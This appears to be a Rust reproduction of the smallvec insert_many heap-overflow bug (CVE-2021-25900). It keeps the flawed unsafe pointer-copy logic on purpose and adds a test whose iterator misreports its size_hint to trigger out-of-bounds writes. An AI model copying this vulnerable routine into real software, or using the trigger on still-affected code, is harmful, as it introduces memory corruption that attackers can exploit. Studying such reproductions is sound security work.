#![no_std]
extern crate alloc;

use alloc::vec::Vec;
use core::ptr;

// Minimal “A” to match A::Item pattern in the original code
pub trait Array {
    type Item;
}

// One concrete Array implementation for testing/compilation
pub struct A8;
impl Array for A8 {
    type Item = u8;
}

// Minimal SmallVec-like container that provides the methods used by insert_many
pub struct SmallVec<A: Array> {
    buf: Vec<A::Item>,
}

impl<A: Array> SmallVec<A> {
    pub fn new() -> Self {
        Self { buf: Vec::new() }
    }

    #[inline] pub fn len(&self) -> usize { self.buf.len() }
    #[inline] pub fn reserve(&mut self, n: usize) { self.buf.reserve(n) }
    #[inline] pub unsafe fn set_len(&mut self, n: usize) { self.buf.set_len(n) }
    #[inline] pub fn extend<I: IntoIterator<Item = A::Item>>(&mut self, it: I) { self.buf.extend(it) }
    #[inline] pub fn insert(&mut self, idx: usize, x: A::Item) { self.buf.insert(idx, x) }
    #[inline] pub fn as_mut_ptr(&mut self) -> *mut A::Item { self.buf.as_mut_ptr() }

    // --------------------------
    // CVE-2021-25900 vulnerable
    // --------------------------
    pub fn insert_many<I: IntoIterator<Item = A::Item>>(&mut self, index: usize, iterable: I) {
        let iter = iterable.into_iter();

        if index == self.len() {
            return self.extend(iter);
        }

        let (lower_size_bound, _upper_size_bound) = iter.size_hint();
        assert!(lower_size_bound <= isize::MAX as usize);
        assert!(index + lower_size_bound >= index);
        self.reserve(lower_size_bound);

        unsafe {
            let old_len = self.len();
            assert!(index <= old_len);

            let mut ptr0 = self.as_mut_ptr().offset(index as isize);

            // Move the trailing elements.
            ptr::copy(ptr0, ptr0.offset(lower_size_bound as isize), old_len - index);

            // In case the iterator panics, don't double-drop the items we just copied above.
            self.set_len(index);

            let mut num_added = 0;
            for element in iter {
                let mut cur = ptr0.offset(num_added as isize);

                if num_added >= lower_size_bound {
                    // Iterator provided more elements than the hint. Move trailing items again.
                    self.reserve(1);
                    ptr0 = self.as_mut_ptr().offset(index as isize);
                    cur = ptr0.offset(num_added as isize);
                    ptr::copy(cur, cur.offset(1), old_len - index);
                }

                ptr::write(cur, element);
                num_added += 1;
            }

            self.set_len(old_len + num_added);
        }
    }
}

/* -----------------------------
   Minimal additions start here
   ----------------------------- */

// Iterator that lies: says lower bound is 0, but yields 1 element.
// This is enough to trigger the bad path when capacity is tight.
pub struct LieIter {
    yielded: bool,
}

impl LieIter {
    pub fn new() -> Self { Self { yielded: false } }
}

impl Iterator for LieIter {
    type Item = u8;

    fn next(&mut self) -> Option<Self::Item> {
        if self.yielded {
            None
        } else {
            self.yielded = true;
            Some(0xAA)
        }
    }

    fn size_hint(&self) -> (usize, Option<usize>) {
        (0, None) // <-- critical: lower bound lies (0) but we yield 1 item
    }
}

#[cfg(test)]
extern crate std;

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn trigger_cve_2021_25900_behavior() {
        // Make capacity tight (cap == len) as much as possible
        let n = 64usize;
        let mut v: SmallVec<A8> = SmallVec::new();

        v.reserve(n);
        v.extend((0u8..).take(n)); // fill to length n

        // Insert at the front using a lying iterator:
        // lower_size_bound = 0, but yields 1 element.
        // Vulnerable code may do ptr::copy with insufficient capacity -> UB.
        v.insert_many(0, LieIter::new());
    }
}

